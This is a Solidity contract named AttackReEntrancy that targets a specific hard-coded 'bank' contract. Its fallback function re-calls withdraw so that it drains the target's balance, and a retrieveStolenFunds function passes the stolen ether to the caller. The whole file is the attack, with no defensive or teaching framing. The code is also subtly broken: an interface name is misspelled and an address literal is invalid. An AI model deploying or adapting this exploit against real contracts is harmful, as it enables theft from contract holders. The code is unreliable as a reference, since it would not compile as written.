pragma solidity ^0.4.25;

contract targertInterface{
    
     function deposit() public payable;
     function withdraw(uint withdrawAmount) public;
}

contract AttackReEntrancy{
    targetInterface bankAddress = targetInterface(TTik4Ef8wsFwoAUDne8ea5RaKDvv8hWamt);
    uint amount = 10000000;
    
    function deposit() public payable {
        bankAddress.deposit.value(amount)();
    }
    
    function getTargetBalance() public view returns(uint){
        
        return address(bankAddress).balance;
    }
    function attack() public payable {
          bankAddress.withdraw(amount);
      }
      
    function retrieveStolenFunds() public {
        msg.sender.transfer(address(this).balance);
    }
      
      
    function () public payable {
        
          if (address(bankAddress).balance >= amount) {
              bankAddress.withdraw(amount);
          }

}
}